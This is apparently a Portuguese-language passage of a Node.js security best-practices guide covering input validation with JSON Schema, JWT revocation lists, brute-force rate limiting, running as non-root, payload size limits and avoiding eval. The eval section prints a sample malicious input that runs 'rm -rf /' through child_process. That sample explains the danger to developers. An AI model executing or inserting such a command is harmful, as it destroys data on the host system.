<p>A validação é sobre ser muito explícito em qual entrada nossa aplicação está disposta a aceitar e falhar rapidamente caso a entrada se desvie das expectativas. Isso minimiza a superfície de um invasor que não pode mais testar cargas com estrutura, valores e comprimento diferentes. Na pratica isso evita ataques como DDOS (é improvável que o código falhe quando a entrada é bem definida) e Deserialização Insegura (JSON não contém surpresas). Embora a validação possa ser codificada ou basear-se em classes e tipos (classes TypeScript, ES6), a comunidade parece gostar cada vez mais de esquemas baseados em JSON, pois eles permitem a declaração de regras complexas sem codificação e compartilham as expectativas com o frontend. O esquema JSON é um padrão emergente que é suportado por muitas bibliotecas e ferramentas npm (por exemplo <a href="https://www.npmjs.com/package/jsonschema" target="_blank" rel="nofollow noopener noreferrer">jsonschema</a>, <a href="http://blog.getpostman.com/2017/07/28/api-testing-tips-from-a-postman-professional/" target="_blank" rel="nofollow noopener noreferrer">Postman</a>), <a href="https://www.npmjs.com/package/joi" target="_blank" rel="nofollow noopener noreferrer">joi</a> também é altamente popular com uma bela sintaxe. Normalmente, a sintaxe JSON não pode abranger todos os cenários de validação e códigos personalizados ou estruturas de validação pré-criadas, como <a href="https://github.com/chriso/validator.js/" target="_blank" rel="nofollow noopener noreferrer">validator.js</a> vêm a calhar. Independentemente da sintaxe escolhida, certifique-se de executar a validação o mais cedo possível - Por exemplo, usando o middleware Express que valida o corpo da solicitação antes que a solicitação seja passada para o manipulador de rota</p>
<h3>Exemplo - Regras de validação de JSON-Schema</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token punctuation">{</span>
    <span class="token string">"$schema"</span><span class="token operator">:</span> <span class="token string">"http://json-schema.org/draft-06/schema#"</span><span class="token punctuation">,</span>
    <span class="token string">"title"</span><span class="token operator">:</span> <span class="token string">"Product"</span><span class="token punctuation">,</span>
    <span class="token string">"description"</span><span class="token operator">:</span> <span class="token string">"A product from Acme's catalog"</span><span class="token punctuation">,</span>
    <span class="token string">"type"</span><span class="token operator">:</span> <span class="token string">"object"</span><span class="token punctuation">,</span>
    <span class="token string">"properties"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token string">"name"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token string">"description"</span><span class="token operator">:</span> <span class="token string">"Name of the product"</span><span class="token punctuation">,</span>
            <span class="token string">"type"</span><span class="token operator">:</span> <span class="token string">"string"</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token string">"price"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token string">"type"</span><span class="token operator">:</span> <span class="token string">"number"</span><span class="token punctuation">,</span>
            <span class="token string">"exclusiveMinimum"</span><span class="token operator">:</span> <span class="token number">0</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token string">"required"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">,</span> <span class="token string">"name"</span><span class="token punctuation">,</span> <span class="token string">"price"</span><span class="token punctuation">]</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>Exemplo - Validando uma entidade usando JSON-Schema</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">const</span> JSONValidator <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"jsonschema"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Validator<span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">Product</span> <span class="token punctuation">{</span>
  
  <span class="token function">validate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> v <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONValidator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> v<span class="token punctuation">.</span><span class="token function">validate</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> schema<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">static</span> <span class="token keyword">get</span> <span class="token function">schema</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">//defina um JSON-Schema, veja o exemplo acima</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>Exemplo - Uso de validador middleware</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token comment">// O validador é um middleware genérico que obtém a entidade que deve validar e toma o cuidado de retornar</span>
<span class="token comment">// Status HTTP 400 (Bad Request) caso a validação da carga útil do corpo falhe</span>
router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/"</span> <span class="token punctuation">,</span> <span class="token operator">**</span><span class="token function">validator</span><span class="token punctuation">(</span>Product<span class="token punctuation">.</span>validate<span class="token punctuation">)</span><span class="token operator">**</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
    <span class="token comment">// código de manipulação de rota vai aqui</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>O que Outros Blogueiros Dizem</h3>
<p>Do blog <a href="https://nemethgergely.com/nodejs-security-overview/" target="_blank" rel="nofollow noopener noreferrer">Gergely Nemeth</a>:</p>
<blockquote>
<p>Validar a entrada do usuário é uma das coisas mais importantes a fazer quando se trata da segurança do seu aplicativo. Não fazer isso corretamente pode abrir o aplicativo e os usuários para uma ampla variedade de ataques, incluindo injeção de comando, injeção de SQL ou scripts de sites cruzados armazenados.</p>
</blockquote>
<p>Para validar a entrada do usuário, uma das melhores bibliotecas que você pode escolher é a joi. Joi é uma linguagem de descrição de esquemas de objeto e um validador para objetos JavaScript.</p>
<h2>6.11. Ajude a inserir JWTs em listas negras</h2>
<p><a href="https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A9:Broken%20Authentication%20-green.svg" alt></a></p>
<p><strong>TL;DR:</strong> Ao usar JSON Web Tokens (por exemplo, com <a href="https://github.com/jaredhanson/passport" target="_blank" rel="nofollow noopener noreferrer">Passport.js</a>), por padrão não existem mecanismos para revogar o acesso de tokens problemáticos. Uma vez descoberta alguma atividade maliciosa do usuário, não há como impedi-lo de acessar o sistema, desde que ele tenha um token válido. Abrande isso implementando uma lista negra de tokens não confiáveis que são validados em cada solicitação.</p>
<p><strong>Caso contrário:</strong> Tokens expirados ou extraviados, podem ser usados maliciosamente por terceiros para acessar uma aplicação e para representar o proprietário do token.</p>
<h1>Tenha suporte à lista negra de JWTs</h1>
<h3>Explicação em um Parágrafo</h3>
<p>Por padrão, os JWTs (JSON Web Tokens) são completamente sem estado, portanto, quando um token válido é assinado por um emissor, o token pode ser verificado como autêntico pela aplicação. O problema que isso causa é a preocupação de segurança em que um token vazado ainda pode ser usado e não pode ser revogado, devido à assinatura permanecer válida, desde que a assinatura fornecida pelos problemas corresponda ao esperado pelo aplicativo.
Devido a isso, ao usar a autenticação do JWT, uma aplicação deve gerenciar uma lista negra de tokens expirados ou revogados para reter a segurança do usuário, no caso de um token precisar ser revogado.</p>
<h3>exemplo <code class="language-text">express-jwt-blacklist</code></h3>
<p>Um exemplo de uso do <code class="language-text">express-jwt-blacklist</code> em um projeto Node.js usando o <code class="language-text">express-jwt</code></p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">var</span> jwt <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-jwt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> blacklist <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-jwt-blacklist'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">jwt</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  secret<span class="token operator">:</span> <span class="token string">'my-secret'</span><span class="token punctuation">,</span>
  isRevoked<span class="token operator">:</span> blacklist<span class="token punctuation">.</span>isRevoked
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  blacklist<span class="token punctuation">.</span><span class="token function">revoke</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>user<span class="token punctuation">)</span>
  res<span class="token punctuation">.</span><span class="token function">sendStatus</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>O que Outros Blogueiros Dizem</h3>
<p>Do blog de <a href="http://waiting-for-dev.github.io/blog/2017/01/25/jwt_secure_usage/" target="_blank" rel="nofollow noopener noreferrer">Marc Busqué</a>:</p>
<blockquote>
<p>…adicione uma camada de revogação sobre o JWT, mesmo que isso implique na perda de sua natureza sem estado.</p>
</blockquote>
<h2>6.12. Evite ataques de força bruta contra autorização</h2>
<p><a href="https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A9:Broken%20Authentication%20-green.svg" alt></a></p>
<p><strong>TL;DR:</strong> Uma técnica simples e poderosa é limitar as tentativas de autorização usando duas métricas:</p>
<ol>
<li>A primeiro é o número de tentativas consecutivas com falha do mesmo ID/nome e endereço IP exclusivos do usuário.</li>
<li>A segundo é o número de tentativas malsucedidas de um endereço IP durante um longo período de tempo. Por exemplo, bloqueie um endereço IP se ele fizer 100 tentativas com falha em um dia.</li>
</ol>
<p><strong>Caso contrário:</strong> Um invasor pode emitir tentativas ilimitadas de senha automatizada para obter acesso a contas com privilégios em uma aplicação.</p>
<h1>Evite ataques de força bruta contra autorização</h1>
<h3>Explicaçãao em um Parágrafo</h3>
<p>Deixar rotas mais privilegiadas como <code class="language-text">/ login</code> ou <code class="language-text">/ admin</code> expostas sem limitação de taxa deixa uma aplicação em risco de ataques de dicionário de senha de força bruta. O uso de uma estratégia para limitar as solicitações para essas rotas pode impedir o sucesso disso, limitando o número de tentativas de permissão com base em uma propriedade de solicitação, como ip, ou um parâmetro de corpo, como nome de usuário/endereço de email.</p>
<h3>Exemplo de código: conta tentativas consecutivas de autorização com falha por um par nome de usuário e IP, e o total de falhas por endereço IP.</h3>
<p>Usando o pacote npm: <a href="https://www.npmjs.com/package/rate-limiter-flexible" target="_blank" rel="nofollow noopener noreferrer">rate-limiter-flexible</a>.</p>
<p>Crie dois limitadores:</p>
<ol>
<li>A primeira conta número de tentativas consecutivas com falha e permite no máximo 10 por par nome de usuário e IP.</li>
<li>O segundo bloqueia o endereço IP por um dia caso 100 tentativas malsucedidas ocorram em um dia.</li>
</ol>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">const</span> maxWrongAttemptsByIPperDay <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> maxConsecutiveFailsByUsernameAndIP <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> limiterSlowBruteByIP <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RateLimiterRedis</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  storeClient<span class="token operator">:</span> redisClient<span class="token punctuation">,</span>
  keyPrefix<span class="token operator">:</span> <span class="token string">'login_fail_ip_per_day'</span><span class="token punctuation">,</span>
  points<span class="token operator">:</span> maxWrongAttemptsByIPperDay<span class="token punctuation">,</span>
  duration<span class="token operator">:</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">24</span><span class="token punctuation">,</span>
  blockDuration<span class="token operator">:</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token comment">// Bloqueia por 1 dia, se 100 tentativas erradas ocorrem em 1 dia</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> limiterConsecutiveFailsByUsernameAndIP <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RateLimiterRedis</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  storeClient<span class="token operator">:</span> redisClient<span class="token punctuation">,</span>
  keyPrefix<span class="token operator">:</span> <span class="token string">'login_fail_consecutive_username_and_ip'</span><span class="token punctuation">,</span>
  points<span class="token operator">:</span> maxConsecutiveFailsByUsernameAndIP<span class="token punctuation">,</span>
  duration<span class="token operator">:</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">24</span> <span class="token operator">*</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token comment">// Guarda o número por 90 dias desde a primeira falha</span>
  blockDuration<span class="token operator">:</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token comment">// Bloqueia por 1 hora</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>Veja o exemplo completo na <a href="https://github.com/animir/node-rate-limiter-flexible/wiki/Overall-example#login-endpoint-protection" target="_blank" rel="nofollow noopener noreferrer">Wiki do pacote rate-limiter-flexible</a>.</p>
<h3>O que Outros Blogueiros Dizem</h3>
<p>Do livro Essential Node.js Security de <a href="https://leanpub.com/nodejssecurity" target="_blank" rel="nofollow noopener noreferrer">Liran Tal</a>:</p>
<blockquote>
<p>Ataques de força bruta podem ser empregados por um invasor para enviar uma série de pares de nome de usuário/senha para seus pontos de extremidade REST sobre POST ou outra API RESTful que você tenha aberto para implementá-los. Esse ataque de dicionário é muito direto e fácil de executar e pode ser executado em qualquer outra parte da sua API ou roteamento de página, sem relação com logins.</p>
</blockquote>
<h2>6.13. Rode o Node.js como um usuário que não seja root</h2>
<p><a href="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A5:Broken%20Access%20Access%20Control-green.svg" alt></a></p>
<p><strong>TL;DR:</strong> Existe um cenário comum em que o Node.js é executado como um usuário root com permissões ilimitadas. Por exemplo, esse é o comportamento padrão em contêineres do Docker. É recomendável criar um usuário não raiz e associá-lo à imagem do Docker (exemplos abaixo) ou executar o processo em nome desse usuário chamando o container com o sinalizador “-u username”.</p>
<p><strong>Caso contrário:</strong> Um invasor que consiga executar um script no servidor obtém poder ilimitado sobre a máquina local (por exemplo, alterar o iptable e redirecionar o tráfego para seu servidor).</p>
<h1>Rode o Node.js como um usuário que não seja root</h1>
<h3>Explicação em um Parágrafo</h3>
<p>De acordo com o “Princípio do menor privilégio”, um usuário/processo deve ser capaz de acessar apenas as informações e recursos necessários. A concessão de acesso root a um invasor abre um novo mundo de ideias mal-intencionadas, como o roteamento de tráfego para outros servidores. Na prática, a maioria das aplicações Node.js não precisa de acesso root e não é executada com esses privilégios. No entanto, existem dois cenários comuns que podem levar ao uso da raiz:</p>
<ul>
<li>para obter acesso à uma porta de privilégios (por exemplo, porta 80), o Node.js deve ser executado como raiz</li>
<li>Contêineres do Docker, por padrão, são executados como root (!). É recomendado que aplicações Web Node.js escutem em portas sem privilégios e confiem em um proxy reverso como nginx para redirecionar o tráfego de entrada da porta 80 para a aplicação Node.js. Ao criar uma imagem do Docker, as aplicações altamente protegidas devem executar o contêiner com um usuário alternativo não root. A maioria dos clusters Docker (por exemplo, Swarm, Kubernetes) permitem definir o contexto de segurança declarativamente</li>
</ul>
<h3>Exemplo de código - Criando uma imagem do Docker como não root</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token constant">FROM</span> node<span class="token operator">:</span>latest
<span class="token constant">COPY</span> <span class="token keyword">package</span><span class="token punctuation">.</span>json <span class="token punctuation">.</span>
<span class="token constant">RUN</span> npm install
<span class="token constant">COPY</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span>
<span class="token constant">EXPOSE</span> <span class="token number">3000</span>
<span class="token constant">USER</span> node
<span class="token constant">CMD</span> <span class="token punctuation">[</span><span class="token string">"node"</span><span class="token punctuation">,</span> <span class="token string">"server.js"</span><span class="token punctuation">]</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>Citação de Blog: “Por padrão, o Docker executa contêiner como root”</h3>
<p>Do repositório docker-node por <a href="https://github.com/nodejs/docker-node/blob/master/docs/BestPractices.md#non-root-user" target="_blank" rel="nofollow noopener noreferrer">eyalzek</a>:</p>
<blockquote>
<p>Por padrão, o Docker executa o contêiner como root, que dentro do contêiner pode representar um problema de segurança. Você deseja executar o contêiner como um usuário não privilegiado sempre que possível. As imagens do node fornecem o usuário do node para esse propósito. A imagem do Docker pode então ser executada com o usuário do nó da seguinte maneira: “-u ‘node’”</p>
</blockquote>
<h3>Citação de Blog: “O atacante terá controle total sobre sua máquina”</h3>
<p>Não execute Node.js como root por <a href="http://syskall.com/dont-run-node-dot-js-as-root/" target="_blank" rel="nofollow noopener noreferrer">Olivier Lalonde</a>:</p>
<blockquote>
<p>De fato, se você estiver executando seu servidor como root e ele for invadido por meio de uma vulnerabilidade em seu código, o invasor terá controle total sobre sua máquina. Isso significa que o invasor pode acabar com todo o seu disco ou pior. Por outro lado, se o servidor for executado com as permissões de um usuário comum, o invasor será limitado por essas permissões.</p>
</blockquote>
<h3>Citação de Blog: “Se você precisar executar seu aplicativo na porta 80 ou 443, poderá fazer o encaminhamento de porta”</h3>
<p>Desenvolvendo Aplicações Node.js Seguros - Um Guia Amplo por <a href="https://jsblog.insiderattack.net/developing-secure-node-js-applications-a-broad-guide-286afdec69ce" target="_blank" rel="nofollow noopener noreferrer">Deepal Jayasekara</a>:</p>
<blockquote>
<p>Nunca execute o Node.js como root. Executar o node.js como root irá causar mais danos caso um invasor de alguma forma ganhar controle sobre sua aplicação. Nesse cenário, o invasor também ganharia privilégios de root, o que poderia resultar em uma catástrofe. Se você precisar executar sua aplicação na porta 80 ou 443, poderá fazer o encaminhamento de porta usando o iptables ou poderá colocar um proxy front-end, como nginx ou apache, que encaminha a solicitação da porta 80 ou 443 para sua aplicação</p>
</blockquote>
<h2>6.14. Limite o tamanho do payload usando um proxy reverso ou um middleware</h2>
<p><a href="https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A8:Insecured%20Deserialization%20-green.svg" alt></a> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20DDOS%20-green.svg" alt></a></p>
<p><strong>TL;DR:</strong> Quanto maior o payload do body, mais difícil será o processamento de um único segmento. Esta é uma oportunidade para os invasores colocarem seus servidores de joelhos sem uma enorme quantidade de solicitações (ataques DOS / DDOS). Reduza isso limitando o tamanho do corpo das solicitações recebidas (por exemplo, firewall, ELB) ou configurando o <a href="https://github.com/expressjs/body-parser" target="_blank" rel="nofollow noopener noreferrer">express body parser</a> para aceitar somente cargas de tamanho pequeno.</p>
<p><strong>Caso contrário:</strong> Sua aplicação terá que lidar com solicitações grandes, incapazes de processar o outro trabalho importante que ele precisa realizar, o que leva a implicações de desempenho e vulnerabilidade em relação a ataques DOS.</p>
<h1>Limite o tamanho do payload usando um proxy reverso ou um middleware</h1>
<h3>Explicação em um Parágrafo</h3>
<p>A análise do corpo de uma requisição, por exemplo, payloads codificadas em JSON, é uma operação com desempenho pesado, especialmente com solicitações maiores.
Ao lidar com solicitações recebidas em sua aplicação web, você deve limitar o tamanho de seus respectivos payloads. Pedidos recebidos com
tamanhos ilimitados de corpo/payload podem levar a um desempenho ruim da sua aplicação ou falha devido a uma interrupção de negação de serviço ou outros efeitos colaterais indesejados.
Muitas soluções de middleware populares para análise de corpos de requisições, como o pacote <code class="language-text">body-parser</code> já incluído para express, possui
opções para limitar os tamanhos de payloads de requisições, facilitando a implementação dessa funcionalidade pelos desenvolvedores.
Você também pode integrar um limite de tamanho do corpo da requisição no seu software de proxy reverso/servidor Web, se suportado. Abaixo estão exemplos para limitar tamanhos de solicitações usando
<code class="language-text">express</code> e/ou<code class="language-text">nginx</code>.</p>
<h3>Exemplo de código para <code class="language-text">express</code></h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span> limit<span class="token operator">:</span> <span class="token string">'300kb'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// body-parser tem por padrão um limite de tamanho para o corpo de 100kb</span>

<span class="token comment">// Requisição com corpo no formato json</span>
app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/json'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>

    <span class="token comment">// Verifica se o tipo de conteúdo da carga útil da solicitação corresponde ao json, porque o body-parser não verifica os tipos de conteúdo</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span><span class="token function">is</span><span class="token punctuation">(</span><span class="token string">'json'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">sendStatus</span><span class="token punctuation">(</span><span class="token number">415</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// -> Tipo de mídia não suportado se a solicitação não tiver corpo JSON</span>
    <span class="token punctuation">}</span>

    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Hooray, funcionou!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Exemplo de app ouvindo na porta 3000!'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>🔗 <a href="http://expressjs.com/en/4x/api.html#express.json" target="_blank" rel="nofollow noopener noreferrer"><strong>Documentação Express para express.json()</strong></a></p>
<h3>Exemplo de configuração para <code class="language-text">nginx</code></h3>
<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text">http {
    ...
    # Limita o tamanho do corpo para TODAS requisições recebidas para 1 MB
    client_max_body_size 1m;
}

server {
    ...
    # Limita o tamanho do corpo para requisições recebidas por esse bloco específico do servidor para 1 MB
    client_max_body_size 1m;
}

location /upload {
    ...
    # Limita o tamanho do corpo para requisições recebidas nessa essa rota para 1 MB
    client_max_body_size 1m;
}</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>🔗 <a href="http://nginx.org/en/docs/http/ngx_http_core_module.html#client_max_body_size" target="_blank" rel="nofollow noopener noreferrer"><strong>Documentação Nginx para client<em>max</em>body_size</strong></a></p>
<h2>6.15. Evite instruções eval do JavaScript</h2>
<p><a href="https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A7:XSS%20-green.svg" alt></a> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A1:Injection%20-green.svg" alt></a> <a href="https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE)" target="_blank"><img src="https://img.shields.io/badge/%E2%9C%94%20OWASP%20Threats%20-%20A4:External%20Entities%20-green.svg" alt></a></p>
<p><strong>TL;DR:</strong> <code class="language-text">eval</code> é do mal, pois permite a execução de um código JavaScript personalizado durante o tempo de execução. Isso não é apenas uma preocupação de desempenho, mas também uma importante preocupação de segurança devido ao código JavaScript malicioso que pode ser originado da entrada do usuário. Outra feature da linguagem que deve ser evitada é o construtor <code class="language-text">new Function</code> constructor. <code class="language-text">setTimeout</code> e <code class="language-text">setInterval</code> também não devem ser receber código JavaScript dinâmico.</p>
<p><strong>Caso contrário:</strong> o código JavaScript malicioso encontra um caminho para um texto passado para o eval ou outras funções de avaliação em tempo real da linguagem JavaScript, e terá acesso total às permissões do JavaScript na página. Essa vulnerabilidade geralmente se manifesta como um ataque XSS.</p>
<h1>Evite instruções eval do JavaScript</h1>
<h3>Explicação em um Parágrafo</h3>
<p><code class="language-text">eval()</code>, <code class="language-text">setTimeout()</code>, <code class="language-text">setInterval()</code>, e <code class="language-text">new Function()</code> são funções globais, geralmente usadas no Node.js, que aceitam um parâmetro de string que representa uma expressão, instrução ou sequência de instruções JavaScript. A preocupação de segurança de usar essas funções é a possibilidade de que uma entrada de usuário não confiável possa entrar na execução do código, levando ao comprometimento do servidor, já que avaliar o código do usuário essencialmente permite que um invasor execute qualquer ação possível. Sugere-se refatorar código para não depender do uso dessas funções em que a entrada do usuário pode ser passada para a função e executada.</p>
<h3>Exemplo de Código</h3>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token comment">// exemplo de código malicioso que um invasor conseguiu inserir</span>
userInput <span class="token operator">=</span> <span class="token string">"require('child_process').spawn('rm', ['-rf', '/'])"</span><span class="token punctuation">;</span>

<span class="token comment">// código malicioso executado</span>
<span class="token function">eval</span><span class="token punctuation">(</span>userInput<span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>O que Outros Blogueiros Dizem</h3>
<p>Do livro Essential Node.js Security por <a href="https://leanpub.com/nodejssecurity" target="_blank" rel="nofollow noopener noreferrer">Liran Tal</a>:</p>
<blockquote>
<p>A função eval() é talvez a mais desaprovada dentro do JavaScript em uma perspectiva de segurança. Ela analisa uma string JavaScript como texto e a executa como se fosse um código JavaScript.
Misturar isso com entradas não confiáveis ​​do usuário que podem encontrar o caminho para eval() é uma receita para o desastre que
pode acabar comprometendo o servidor.</p>
</blockquote>
<h2>6.16. Evite que RegEx maliciosos sobrecarreguem sua execução de thread único</h2>
